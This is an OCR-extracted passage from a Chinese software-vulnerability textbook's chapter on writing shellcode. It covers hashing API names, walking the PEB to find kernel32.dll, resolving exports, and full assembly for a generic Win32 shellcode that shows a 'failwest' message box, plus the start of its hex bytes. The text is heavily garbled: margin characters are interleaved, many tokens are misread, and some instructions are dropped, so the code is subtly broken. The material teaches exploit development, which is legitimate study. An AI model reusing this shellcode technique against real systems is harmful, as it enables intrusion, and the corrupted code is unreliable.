软
件
们调用MessageBoxA之前，应该先使用LoadLibrary（“user32.dll”）装载其所属的动态链接库。
漏
通过前面介绍的win_32平台下搜索API地址的办法，我们可以从FS所指的线程环境块开
洞
始，一直追溯到动态链接库的函数名导出表，在其中搜索出所需的API函数是第几个，然后在
分
函数偏移地址（RVA）导出表中找到这个地址。
析
由于shellcode最终是要放进缓冲区的，为了让shellcode更加通用，能被大多数缓冲区容
技
术
纳，我们总是希望shellcode尽可能短。因此，在函数名导出表中搜索函数名的时候，一般情况
（第
通常情况下，我们会对所需的API函数名进行hash运算，在搜索导出表时对当前遇到的函数
2
名也进行同样的hash，这样只要比较hash所得的摘要（digest）就能判定是不是我们所需的API
版
了。虽然这种搜索方法需要引入额外的hash算法，但是可以节省出存储函数名字符串的代码。
提示：本书中所说的hash指的是hash算法，是一个运算过程。经过hash后得到的值
将被称做摘要，即digest，请读者注意这种叙述方式。
本节实验中所用hash函数的C代码如下。
#include
#include
DWORD GetHash(char*fun_name
DWORD digest=O;
while(*fun_name)
digest=((digest>7));
//循环右移7位
digest+=*fun_name;
//累加
fun_name++;
return digest;
main()
DWORD hash;
hash=GetHash("AddAtomA");
printf("result of hash is 8.8x\n,hash);
如上述代码，我们将把字符串中的字符逐一取出，把ASCII码从单字节转换成四字节的双
字（DWORD），循环右移7位之后再进行累积。
90
---
## Page 116
第
代码中只比较经过hash运算的函数名摘要，也就是说，不论API函数名多么长，我们只
3
需要存一个双字就行。而上述hash算法只需要用ror和add两条指令就能实现。
章
题外话：在下一节中，我们将讨论怎样精简shellcode的长度，其中会详细讨论按照什
开
么标准来选取hash算法。实际上您会发现hash后的摘要并不一定是一个双字（32bit），
发
精心构造的hash算法可以让一个字节（8bit）的摘要也满足要求。
shellcode
API函数及hash后的摘要如表3-4-1所示。
表3-4-1API函数及hash后的摘要
的
API函数名
经过hash运算后得到的摘要digest
艺
MessageBoxA
0x1e380a6a
术
ExitProcess
0x4fd18963
LoadLibraryA
0x0c917432
在将hash压入栈中之前，注意先将增量标志DF清零。因为当shellcode是利用异常处理
机制而植入的时候，往往会产生标志位的变化，使shellcode中的字串处理方向发生变化而产生
错误（如指令LODSD）。如果您在堆溢出利用中发现原本身经百战的shellcode在运行时出错，
很可能就是这个原因。总之，一个字节的指令可以大大增加shellcode的通用性。
现在可以将这些hash结果压入栈中，并用一个寄存器标识位置，以备后面搜索API函数
时使用。
;store hash
push 0x1e380a6a
;hash of MessageBoxA
push 0x4fd18963
;hash of ExitProcess
push 0x0c917432
;hash of LoadLibraryA
mov esi,esp
;esi=addr of first function hash
leaedi,[esi-0xc]
edi =addr to start writing function
然后我们需要抬高栈顶，保护shellcode不被入栈数据破坏。
;make some stack space
xor ebx,ebx
mov bh,0x04
sub esp,ebx
按照图3.4.1所示，定位kemel32.dll的代码如下。
;find baseaddrof kernel32.dll
mov ebx,fs:[edx+0x30]
;ebx=address of PEB
mov ecx,[ebx+0x0c]
;ecx= pointer toloader data
movecx,[ecx+0x1c）
;ecx= first entry in initialisation
movecx,[ecx]
;ecx=second entry inlist
;(kerne132.d11)
91
---
## Page 117
day安全：
0
mov ebp,[ecx+0x08]
iebp=base
addressof kernel32.dll
在导入表中搜索API的逻辑可以设计如图3.4.2所示。
保存所需函数名的hash值，并初始化寄存器和栈空间等
软件漏洞分析技术
获得kernel32.dl1的基地址
不是
判断当前正在定位的API是否是
MessageBoxA函数
调用LoadLibrary（“user32.d11”）获得user32.dll的加载基址
（第2版）
并把基址指针从kerne132.dl1的基址切换为user32.dl1的基址
由动态链接库加载基址获得函数名称导出
表、函数偏移地址RVA导出衰的入口地址
将指针指向函数名称导出表中下一个函敷名的开始
将当前所指的函敷名（NULL结尾的字符串）
进行循环右移7位再累积的bash运算
不是
判断当前所指函数名的hash与所需
API的hash值是否相等
是
从函数偏移地址表中取出对应的RVA，与动态
链接库地址相加后得到API最终的绝对地址
不是
判断是否所有的API地址都已经找到
是
调用API，完成弹出消
息框的功能后正常退出
图3.4.2定位API的流程图
最终的代码实现如下。
int main()
92
---
## Page 118
第
_asm(
3
CLD
;clear flag DF
章
;store hash
push 0x1e380a6a
:hash of MessageBox
开
push 0x4fd18963
:hash of ExitProcess
发
push 0x0c917432
;hash of LoadLibraryA
shellcode
mov esi,esp
;esi= addr of firat function hash
lea edi,[esi-0xc]
:edi = addr to start writing function
;make some stack space
的
xor ebx,ebx
艺术
mov bh,0x04
sub esp,ebx
;push a pointer to"user32'onto stack
mov bx,0x3233;rest ofebx isnull
push ebx
push 0x72657375
push esp
xor edx,edx
;find base addrofkernel32.d11
movebx,fs:[edx+0x30]
jebx=addres8 of PEB
mov ecx,[ebx+0x0c]
;ecx=pointer to loader data
movecx,
[ecx+0x1c]
;ecx=first entry in initialization
;order list
mov ecx,[ecx]
:ecx=second entry in list
:(kernel32.d11)
movebp,[ecx+0x08]
:ebp=base address ofkernel32.d11
find_lib_functions:
lodsd
;load next hash into aland increnent esi
cmp eax,0x1e380a6a
;hash of MessageBoxA -.trigger
;LoadLibrary("user32")
jne find_functions
xchg eax,ebp
;save current hash
call[edi-0x8]
;LoadLibraryA
xchg eax,ebp
;restore current hash,and update ebp
:with base address of user32.dl1
find_functions:
pushad
:preserve registers
mov eax,[ebp+0x3c]
:eax=start of PE header
mov ecx,[ebp +eax+0x78]:ecx=relative offset of export table
93
---
## Page 119
day
0
add ecx,ebp
;ecx=absolute addr of export table
安
movebx,[ecx+0x20]
;ebx=relative offset of namestable
add ebx,ebp
全
;ebx= absolute addr of names table
xor edi，edi
;edi will count through the functions
：
软
件
next_function_loop:
漏
incedi
;increment function counter
洞
movesi,[ebx+edi*4]
:esi =relative offset of current
分
;function name
析
add esi,ebp
;esi=absolute addr of current
技
;function name
术
cdq
;dl will hold hash(we know eax is
（第
;small)
2
hash_loop:
版
movsx eax,byte ptr[esi]
cmp al,ah
ror edx,7
add edx,eax
incesi
jmphash_loop
compare_hash:
cpedx，[esp+0x1c]
;compare to the requested hash (saved on
;stack from pushad)
jnznext_function_loop
movebx,[ecx+0x24]
:ebx=relative offset of ordinals
;table
add ebx,ebp
;ebx=absoluteaddr ofordinals
;table
'TPAOW
[ebx+2*edi]
;di=ordinal numberofmatched
;function
movebx,[ecx+0x1c]
;ebx =relative offset of address
:table
add ebx,ebp
;ebx=absolute addr of addresstable
addebp,[ebx+4*edi]
;add to ebp (base addr of module)the
;relative offset of matched function
xchg eax,ebp
:move func addr into eax
popedi
:ediis last onto stackin pushad
stosd
;write function addr to[edi] and
;increment edi
push edi
94
---
## Page 120
第
popad
;restore registers
3
;loopuntilwereachendoflasthash
章
cmp eax,0x1e380a6a
jne find_lib_functions
开
发
function_call:
shellcode
xor ebx,ebx
push ebx
;cut string
push0x74736577
push 0x6C696166
;push failwest
mov eax,esp
;load address offailwest
的
艺
push ebx
push eax
术
push eax
push ebx
cal1[edi-0x04]
;call MessageboxA
push ebx
call[edi-0x08]
;call ExitProcess
dou
dou
nop
nop
）
上述汇编代码可以用VC6.0直接编译运行，并生成PE文件。之后可以用OllyDbg或者IDA
等反汇编工具从PE文件的代码节中提取出二进制的机器码如下。
提示：之所以在汇编代码的前后都加上一段nop（0x90），是为了在反汇编工具或调试
时非常方便地区分出shellcode的代码。
1/.06x\.
NOP
"\xFC"//
CLD
"\x68\x6A\x0A1x38\x1E*//
PUSH1E380A6A
"\x68\x63\x89\xD1\x4F*//
PUSH 4FD18963
"\x68\x32\x74\x91\x0C"//
PUSH 0C917432
"\x8B\xF4"//
MOV ESI,ESP
"\x8D\x7E\xF4"//
LEA EDI,DWORD PTR DS:[ESI-C]
"\x33\xDB"//